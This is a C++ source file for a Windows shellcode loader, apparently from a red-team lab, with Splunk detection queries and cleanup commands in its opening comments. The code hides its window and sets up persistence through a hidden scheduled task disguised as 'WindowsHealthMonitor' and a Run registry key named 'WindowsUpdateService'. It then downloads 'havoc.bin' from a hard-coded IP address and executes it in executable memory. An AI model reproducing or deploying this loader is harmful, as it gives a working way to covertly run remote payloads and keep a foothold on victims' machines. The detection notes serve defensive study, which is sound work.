/*
for Detection we must Enabled via Powershell : 
wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:true

for splunk detection :
index=windows 
(sourcetype="WinEventLog:Microsoft-Windows-TaskScheduler/Operational" OR sourcetype="wineventlog:security")
(EventCode=106 OR EventCode=140 OR EventCode=141 OR EventCode=200 OR EventCode=4688 OR EventCode=4657)
| eval TaskAction=case(
    EventCode=106, "Task Created",
    EventCode=140, "Task Updated", 
    EventCode=141, "Task Deleted",
    EventCode=200, "Task Executed",
    EventCode=4688, "Process Creation",
    EventCode=4657, "Registry Modification"
)
| stats count by _time, host, User, TaskAction, TaskName, CommandLine, ObjectName
| sort - _time


schtasks /query /fo list | findstr "WindowsHealthMonitor"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateService

schtasks /delete /tn "WindowsHealthMonitor" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /f

persis on RUN Key via normal user
persis on Schtasks via prvilege user
*/

/*
flase positive log :
index=windows sourcetype="wineventlog:security" EventCode=4688
(CommandLine="*schtasks*" OR CommandLine="*at.exe*" OR ProcessName="schtasks.exe" OR ProcessName="at.exe")
| search CommandLine="*/create*" OR CommandLine="*create*"
| table _time, host, User, ParentCommandLine, CommandLine

Registry changes for Scheduled Tasks:
index=windows sourcetype="wineventlog:security" EventCode=4657
ObjectName="*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache*"
| table _time, host, User, ObjectName, ProcessName
    
*/

#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <taskschd.h>
#include <comdef.h>
#include <atlcomcli.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
void ExecuteShellcode(std::vector<BYTE>& shellcode);
BOOL CreateScheduledTask();
BOOL CreateRegistryPersistence();

int main()
{
    // Hide any potential console window
    HWND hConsole = GetConsoleWindow();
    if (hConsole != NULL) {
        ShowWindow(hConsole, SW_HIDE);
    }

    // Try multiple non-admin persistence methods
    BOOL taskCreated = CreateScheduledTask();
    BOOL registryCreated = CreateRegistryPersistence();

    // Download and execute payload
    std::vector<BYTE> shellcode = Download(L"192.168.215.132", L"/havoc.bin");

    if (!shellcode.empty()) {
        ExecuteShellcode(shellcode);
    }

    // Keep process running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

BOOL CreateScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* pRegisteredTask = NULL;
    ITaskDefinition* pTask = NULL;

    BOOL success = FALSE;

    try {
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
            IID_ITaskService, (void**)&pService);
        if (FAILED(hr)) throw std::exception();

        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) throw std::exception();

        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) throw std::exception();

        hr = pService->NewTask(0, &pTask);
        if (FAILED(hr)) throw std::exception();

        // KEY CHANGE: Use interactive token (no admin required)
        IPrincipal* pPrincipal = NULL;
        hr = pTask->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr)) {
            pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN); // User context
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_LUA); // Standard user privilege
            pPrincipal->Release();
        }

        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        if (SUCCEEDED(hr)) {
            pSettings->put_StartWhenAvailable(VARIANT_BOOL(true));
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_BOOL(false));
            pSettings->put_StopIfGoingOnBatteries(VARIANT_BOOL(false));
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
            pSettings->put_AllowHardTerminate(VARIANT_BOOL(false));
            pSettings->put_Hidden(VARIANT_BOOL(true));
            pSettings->Release();
        }

        ITriggerCollection* pTriggerCollection = NULL;
        hr = pTask->get_Triggers(&pTriggerCollection);
        if (SUCCEEDED(hr)) {
            ITrigger* pTrigger = NULL;
            hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
            if (SUCCEEDED(hr)) {
                ILogonTrigger* pLogonTrigger = NULL;
                hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                if (SUCCEEDED(hr)) {
                    pLogonTrigger->put_Id(_bstr_t(L"LogonTrigger1"));
                    pLogonTrigger->put_Delay(_bstr_t(L"PT30S"));
                    pLogonTrigger->Release();
                }
                pTrigger->Release();
            }
            pTriggerCollection->Release();
        }

        IActionCollection* pActionCollection = NULL;
        hr = pTask->get_Actions(&pActionCollection);
        if (SUCCEEDED(hr)) {
            IAction* pAction = NULL;
            hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
            if (SUCCEEDED(hr)) {
                IExecAction* pExecAction = NULL;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (SUCCEEDED(hr)) {
                    WCHAR modulePath[MAX_PATH];
                    GetModuleFileNameW(NULL, modulePath, MAX_PATH);

                    pExecAction->put_Path(_bstr_t(modulePath));
                    pExecAction->put_Arguments(_bstr_t(L""));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActionCollection->Release();
        }

        // KEY CHANGE: Use interactive token for registration
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"WindowsHealthMonitor"),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_INTERACTIVE_TOKEN, // User context
            _variant_t(L""),
            &pRegisteredTask);

        if (SUCCEEDED(hr)) {
            success = TRUE;
        }

    }
    catch (...) {
        success = FALSE;
    }

    if (pRegisteredTask) pRegisteredTask->Release();
    if (pTask) pTask->Release();
    if (pRootFolder) pRootFolder->Release();
    if (pService) pService->Release();

    CoUninitialize();
    return success;
}

BOOL CreateRegistryPersistence() {
    HKEY hKey;
    WCHAR modulePath[MAX_PATH];

    GetModuleFileNameW(NULL, modulePath, MAX_PATH);

    // KEY CHANGE: Use HKEY_CURRENT_USER (no admin required)
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);

    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, L"WindowsUpdateService", 0, REG_SZ,
            (BYTE*)modulePath, (wcslen(modulePath) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);

        return (result == ERROR_SUCCESS);
    }

    return FALSE;
}

// Your existing Download and ExecuteShellcode functions remain the same
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    std::vector<BYTE> buffer;

    HINTERNET hSession = WinHttpOpen(L"UserAgent/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return buffer;

    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {

        DWORD bytesRead = 0;
        BYTE temp[4096];

        do {
            bytesRead = 0;
            if (WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
                buffer.insert(buffer.end(), temp, temp + bytesRead);
            }
        } while (bytesRead > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

void ExecuteShellcode(std::vector<BYTE>& shellcode) {
    LPVOID ptr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (ptr != NULL) {
        memcpy(ptr, shellcode.data(), shellcode.size());
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, NULL);

        if (hThread != NULL) {
            CloseHandle(hThread);
        }
    }
}
